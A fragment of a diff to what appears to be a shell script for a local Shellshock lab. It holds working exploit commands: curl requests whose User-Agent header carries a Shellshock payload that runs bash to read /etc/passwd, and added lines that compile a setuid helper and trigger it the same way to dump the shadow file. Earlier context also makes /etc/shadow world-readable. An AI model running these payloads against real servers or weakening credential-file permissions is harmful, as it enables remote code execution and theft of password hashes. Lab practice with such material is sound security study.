@@ -18,4 +18,6 @@ chmod +r /etc/shadow
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://127.0.0.1:8080/cgi-bin/info
 
 
-
+gcc -o show-shadow /usr/lib/cgi-bin/cat.c
+chmod u+s show-shadow
+curl -H "user-agent: () { :; }; echo; echo; /usr/lib/cgi-bin/show-shadow" http://127.0.0.1:8080/cgi-bin/info
